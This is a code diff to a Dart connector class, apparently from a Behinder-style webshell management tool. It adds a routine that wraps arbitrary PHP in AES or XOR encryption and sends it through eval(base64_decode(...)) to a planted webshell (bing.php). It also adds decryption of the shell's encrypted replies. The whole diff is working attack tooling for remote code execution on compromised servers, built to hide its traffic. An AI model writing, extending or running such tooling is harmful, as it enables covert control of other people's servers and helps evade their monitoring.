@@ -3,6 +3,7 @@ import 'dart:convert';
 import 'dart:typed_data';
 
 import 'package:encrypt/encrypt.dart' as enc;
+import 'package:flutter/foundation.dart';
 import 'package:http/http.dart' as http;
 
 import '../core/crypto/behinder_crypto.dart';
@@ -93,13 +94,39 @@ class PhpBehinderConnector extends ShellConnector {
     }
   }
 
+  /// 把 PHP 代码包上 ob_start + JSON + AES/XOR 加密，对标标准 Behinder 响应格式。
+  String _wrapPhpWithEncrypt(String phpCode) {
+    final key = _aesKey;
+    return '''
+@ob_start();
+$phpCode
+\$output = @ob_get_clean();
+if (\$output === false) \$output = '';
+\$result = array(
+    "status" => base64_encode("success"),
+    "msg" => base64_encode(\$output)
+);
+\$json = json_encode(\$result);
+if (extension_loaded('openssl')) {
+    echo @openssl_encrypt(\$json, "AES128", "$key");
+} else {
+    \$k = "$key";
+    for (\$i = 0; \$i < strlen(\$json); \$i++) {
+        \$json[\$i] = \$json[\$i] ^ \$k[(\$i + 1) & 15];
+    }
+    echo \$json;
+}
+''';
+  }
+
   Future<String> _sendPhpUnlocked(String phpCode) async {
     try {
       // 目标 bing.php 使用 explode('|') 来分离类名和参数。
       // 如果 phpCode 中包含 '|'，代码会被截断导致 eval 失败。
       // 因此必须用 base64 将代码包装一层，确保传输层没有 '|' 字符。
+      final wrapped = _wrapPhpWithEncrypt(phpCode);
       final safeCode =
-          "eval(base64_decode('${base64.encode(utf8.encode(phpCode))}'));";
+          "eval(base64_decode('${base64.encode(utf8.encode(wrapped))}'));";
       final payload = 'C|$safeCode';
       final body = _aesEncryptBase64(payload);
 
@@ -112,7 +139,15 @@ class PhpBehinderConnector extends ShellConnector {
       _lastHttpResponseBodyBytes = response.bodyBytes.length;
       _updateCookies(response);
       if (response.statusCode == 200) {
-        return decodeWithFallback(response.bodyBytes);
+        final body = decodeWithFallback(response.bodyBytes);
+        // 标准 Behinder PHP：base64(AES/CBC/zeroIV(json))
+        // → XOR raw bytes（无 OpenSSL）
+        // → Matrix 旧版：明文 或 base64(AES/ECB)
+        final decrypted = BehinderCrypto.tryDecryptPhp(body, _aesKey) ??
+            BehinderCrypto.tryDecryptPhpXor(response.bodyBytes, _aesKey) ??
+            BehinderCrypto.tryDecryptLegacyMatrix(body, _aesKey);
+        if (decrypted != null) return BehinderCrypto.extractResponse(decrypted);
+        return body;
       }
       final respBody = decodeWithFallback(response.bodyBytes);
       final snippet = respBody.length > 4096
